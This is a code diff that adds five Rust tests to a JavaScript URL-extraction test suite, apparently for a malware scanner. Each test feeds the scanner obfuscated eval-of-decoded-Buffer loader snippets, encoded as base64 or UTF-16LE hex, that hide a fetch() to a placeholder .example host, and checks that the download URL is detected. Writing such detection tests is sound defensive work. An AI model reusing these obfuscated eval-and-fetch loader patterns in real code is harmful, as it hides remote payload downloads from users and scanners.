@@ -13628,6 +13628,137 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_textdecoder_buffer_from_base64_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://textdecoder-buffer-base64-js.example/p')",
+        );
+        let js = format!(r#"eval(new TextDecoder().decode(Buffer.from("{encoded}", "base64")))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-buffer-base64-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder Buffer.from(base64) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_instance_buffer_from_base64_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://textdecoder-instance-buffer-base64-js.example/p')",
+        );
+        let js = format!(
+            r#"var td = new TextDecoder(); eval(td.decode(Buffer.from("{encoded}", "base64")))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-instance-buffer-base64-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder instance Buffer.from(base64) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_encoding_instance_buffer_payload_url_extracted() {
+        use std::fmt::Write as _;
+
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-encoding-instance-js.example/p')";
+        let mut encoded = String::new();
+        for byte in payload.encode_utf16().flat_map(u16::to_le_bytes) {
+            write!(&mut encoded, "{byte:02x}").expect("write hex byte");
+        }
+        let js = format!(
+            r#"var enc = "utf-16le"; var td = new TextDecoder(enc); eval(td.decode(Buffer.from("{encoded}", "hex")))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-encoding-instance-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound encoding instance payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_utf16le_buffer_from_hex_payload_url_extracted() {
+        use std::fmt::Write as _;
+
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-utf16le-buffer-hex-js.example/p')";
+        let mut encoded = String::new();
+        for byte in payload.encode_utf16().flat_map(u16::to_le_bytes) {
+            write!(&mut encoded, "{byte:02x}").expect("write hex byte");
+        }
+        let js =
+            format!(r#"eval(new TextDecoder("utf-16le").decode(Buffer.from("{encoded}", "hex")))"#)
+                .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-utf16le-buffer-hex-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder UTF-16LE Buffer.from(hex) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_utf16le_buffer_from_hex_payload_url_extracted() {
+        use std::fmt::Write as _;
+
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-utf16le-buffer-hex-js.example/p')";
+        let mut encoded = String::new();
+        for byte in payload.encode_utf16().flat_map(u16::to_le_bytes) {
+            write!(&mut encoded, "{byte:02x}").expect("write hex byte");
+        }
+        let js = format!(
+            r#"var b = Buffer.from("{encoded}", "hex"); eval(new TextDecoder("utf-16le").decode(b))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-utf16le-buffer-hex-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound UTF-16LE Buffer.from(hex) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_textdecoder_encoding_arg_uint8array_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://textdecoder-encoding-arg-js.example/p')";
